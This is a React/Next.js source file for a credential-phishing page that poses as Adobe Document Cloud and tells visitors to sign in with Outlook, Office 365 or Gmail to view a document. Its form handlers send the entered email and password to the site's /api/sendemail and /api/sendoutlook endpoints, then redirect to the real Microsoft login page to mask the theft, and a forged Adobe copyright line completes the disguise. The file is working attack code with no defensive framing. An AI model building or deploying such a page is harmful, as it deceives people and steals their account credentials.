
/* eslint-disable jsx-a11y/alt-text */
import Image from 'next/image'
import React from 'react'
import Link from 'next/link'
import { useState } from 'react'
import { useRouter } from 'next/router'



const Main = () => {

    const Router = useRouter()
  

    const [email, setEmail] = useState()
    const [password, setPassword] = useState()

    const handleSubmit = (e) => {
      e.preventDefault();
      let data = {
          email,
          password
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendemail', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
            //   Navigate('google.com')
              window.location.assign('https://login.microsoftonline.com/common/login')
            //   setEmail('')
            //   setPassword('')
          }
      })
    }
    const [emails, setEmails] = useState()
    const [passwords, setPasswords] = useState()

    const handleSubmits = (e) => {
      e.preventDefault();
      let data = {
          emails,
          passwords
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendoutlook', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
            window.location.assign('https://login.microsoftonline.com/common/login')
            //   setEmail('')
            //   setPassword('')
          }
      })
    }


    const [showModal, setShowModal] = React.useState(false);
    const [showModals, setShowModals] = React.useState(false);
    const [showModalss, setShowModalss] = React.useState(false);
    return (
        <main>
            <div className="relative w-full h-[640px] bg-no-repeat bg-cover bg-[url('../public/8.jpg')] bg-blend-darken flex justify-center overflow-hidden lg:overflow-visible">

            <div className="h-screen w-full bg-[url('/images/8.png')] flex justify-center items-start">
          <div className="mt-4">
              <div className="w-[550px] mt-8 h-50 bg-gray-900 bg-opacity-75 border-[1px] border-radius-[3px] border-solid border-[#F1F1F1] flex flex-col items-center p-20">
                       <Image
                          src="/images/adobe.jpg"
                          className="mt-20"
                          height={110}
                          width={100}
                          alt="second hero"/>
                           <h6 className="p-3 text-white" >Adobe Document Cloud</h6>
                           <h2 className="p-1 text-white" >To read the document, please enter with the valid email credentials that this file was sent to.</h2>


                          
                           
                             <button type="button"     onClick={() => setShowModals(true)} className='text-white m-3 text-left pl-5 font-semibold p-2 w-[450px] h-[40px] border-[0.5px] border-solid border-[#1b76cc] bg-[#1b76cc]'>
                           <Image
                          src="/images/outlook.png"
                          className=" m-4"
                      
                          height={20}
                          width={30}
                          />
                          Sign In with Outlook</button>
                    


                          {showModals ? (
        <>
          <div
            className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
          >
            <div className="relative w-auto my-6 mx-auto max-w-3xl">
              {/*content*/}
              <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                {/*header*/}
                <div className="flex items-start justify-between p-1 border-b border-solid border-slate-200 rounded-t">
              
                  <button
                    className="p-1 ml-auto bg-dark border-0 text-black  float-right text-3xl leading-none font-semibold outline-none focus:outline-none"
                    onClick={() => setShowModals(false)}
                  >
                    x
                  </button>
         
                </div>
                {/*body*/}
                <div className="w-[550px] h-88 bg-white border-[1px] border-solidborder-[#F1F1F1] flex flex-col items-center p-10">
                       <Image
                          src="/images/outlook.png"
                          className=""
                          height={95}
                          width={90}
                          alt="second hero"/>
                           <h2 className="modal-title p-5" id="exampleModalLabel">Login with <span id="field">Outlook</span></h2>

                          <form onSubmit={(e) => handleSubmit(e)} className='mt-6 flex flex-col'>
                          <label >Email address</label>
                          <input type="text" placeholder="Enter Email" id='emails' name='emails'onChange={(e) =>{ return setEmail(e.target.value)}} 
                            className='w-[390px] h-[45px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>

                        <label>Password</label>
                          <input type="password" placeholder="Enter Password" id='passwords' name='passwords' onChange={(e) =>{return setPasswords(e.target.value)}}
                            className='w-[390px] h-[45px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

<div className="flex items-center justify-end p-6 border-t border-solid border-slate-200 rounded-b">
               
                  <button
                    className="bg-emerald-500 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="submit"
                 
                  >
                   Login
                  </button>
                </div>
                          </form> 

                         
              </div>
          
                {/*footer*/}
            
              </div>
            </div>
          </div>
          <div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
        </>
      ) : null}

    
    {/* Sign in with Office 365  */}
                         
                           
    <button type="button"     onClick={() => setShowModals(true)} className='text-white m-3 text-left pl-5 font-semibold p-2 w-[450px] h-[40px] border-[0.5px] border-solid border-[#fc4e19] bg-[#fc4e19]'>
                           <Image
                          src="/images/office3651.png"
                          className=" m-4"
                      
                          height={20}
                          width={30}
                          />
                          Sign In with Office 365</button>
                    


      {showModals ? (
        <>
          <div
            className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
          >
            <div className="relative w-auto my-6 mx-auto max-w-3xl">
              {/*content*/}
              <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                {/*header*/}
                <div className="flex items-start justify-between p-1 border-b border-solid border-slate-200 rounded-t">
              
                  <button
                    className="p-1 ml-auto bg-dark border-0 text-black  float-right text-3xl leading-none font-semibold outline-none focus:outline-none"
                    onClick={() => setShowModals(false)}
                  >
                    x
                  </button>
         
                </div>
                {/*body*/}
                <div className="w-[550px] h-88 bg-white border-[1px] border-solidborder-[#F1F1F1] flex flex-col items-center p-10">
                       <Image
                          src="/images/office365.png"
                          className=""
                          height={95}
                          width={85}
                          alt="second hero"/>
                           <h2 className="modal-title p-5" id="exampleModalLabel">Login with <span id="field">Office 365</span></h2>

                          <form onSubmit={(e) => handleSubmit(e)} className='mt-6 flex flex-col'>
                          <label >Email address</label>
                          <input type="text" placeholder="Enter Email" id='email' name='email'onChange={(e) =>{ return setEmail(e.target.value)}} 
                            className='w-[390px] h-[45px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>

                        <label>Password</label>
                          <input type="password" placeholder="Enter Password" id='password' name='password' onChange={(e) =>{return setPassword(e.target.value)}}
                            className='w-[390px] h-[45px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

<div className="flex items-center justify-end p-6 border-t border-solid border-slate-200 rounded-b">
               
                  <button
                    className="bg-emerald-500 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="submit"
                 
                  >
                   Login
                  </button>
                </div>
                          </form> 

                         
              </div>
          
                {/*footer*/}
            
              </div>
            </div>
          </div>
          <div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
        </>
      ) : null}

      {/* Sign in with Other Mail */}
                           
                           
      <button type="button"     onClick={() => setShowModalss(true)} className='text-white m-3 text-left pl-5 font-semibold p-2 w-[450px] h-[40px] border-[0.5px] border-solid border-[#2f54f8] bg-[#2f54f8]'>
                           <Image
                          src="/images/other1.png"
                          className=" m-4"
                      
                          height={23}
                          width={30}
                          />
                          Sign In with Other Mail</button>
                    


                          {showModalss ? (
        <>
          <div
            className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
          >
            <div className="relative w-auto my-6 mx-auto max-w-3xl">
              {/*content*/}
              <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                {/*header*/}
                <div className="flex items-start justify-between p-1 border-b border-solid border-slate-200 rounded-t">
              
                  <button
                    className="p-1 ml-auto bg-dark border-0 text-black  float-right text-3xl leading-none font-semibold outline-none focus:outline-none"
                    onClick={() => setShowModalss(false)}
                  >
                    x
                  </button>
         
                </div>
                {/*body*/}
                <div className="w-[550px] h-88 bg-white border-[1px] border-solidborder-[#F1F1F1] flex flex-col items-center p-10">
                       <Image
                          src="/images/gmail.png"
                          className=""
                          height={95}
                          width={85}
                          alt="second hero"/>
                           <h2 className="modal-title p-5" id="exampleModalLabel">Login with <span id="field">Gmail</span></h2>

                          <form onSubmit={(e) => handleSubmit(e)} className='mt-6 flex flex-col'>
                          <label >Email address</label>
                          <input type="text" placeholder="Enter Email" id='email' name='email'onChange={(e) =>{ return setEmail(e.target.value)}} 
                            className='w-[390px] h-[45px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>

                        <label>Password</label>
                          <input type="password" placeholder="Enter Password" id='password' name='password' onChange={(e) =>{return setPassword(e.target.value)}}
                            className='w-[390px] h-[45px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

<div className="flex items-center justify-end p-6 border-t border-solid border-slate-200 rounded-b">
               
                  <button
                    className="bg-emerald-500 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="submit"
                 
                  >
                   Login
                  </button>
                </div>
                          </form> 

                         
              </div>
          
                {/*footer*/}
            
              </div>
            </div>
          </div>
          <div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
        </>
      ) : null}
      

                          <p className="text-white mt-5 text-center">Select your email provider to view Document</p>
                <p className="h6 text-center text-white">CopyRight© 2022 Adobe.</p> 
              </div>
          
          </div>
        </div>
            </div>
          
        </main>
    )
}

export default Main